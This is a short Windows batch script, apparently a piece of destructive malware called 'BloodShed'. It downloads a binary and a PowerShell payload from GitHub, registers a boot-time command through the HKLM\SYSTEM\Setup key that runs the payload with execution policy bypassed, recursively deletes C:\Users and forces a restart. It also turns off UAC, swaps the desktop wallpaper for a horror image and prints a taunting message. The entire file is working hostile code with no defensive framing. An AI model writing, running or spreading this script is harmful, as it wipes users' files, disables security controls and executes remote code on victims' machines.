@echo off
color A
title BloodShed

curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin?raw=true" -o C:\bloodshed.bin
curl -L "https://raw.githubusercontent.com/Syed930s/CUTEB0YPAYL0AD/refs/heads/main/CuteBoyPayload.ps1" -o C:\CuteBoyPayload.ps1

reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d "cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\CuteBoyPayload.ps1 & del /f /s /q C:\Users & shutdown /r /t 5" /f
reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul

curl -L "https://wallpaperbat.com/down/409151-dark-evil-horror-spooky-creepy-scary-wallpaper-2560x1440" -o C:\DeathNet.png
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\DeathNet.png" /f
start explorer.exe

echo Your PC has been Bloodshedded by The Bloodshed...
echo Don't reboot, friend! The payload will run on next boot.
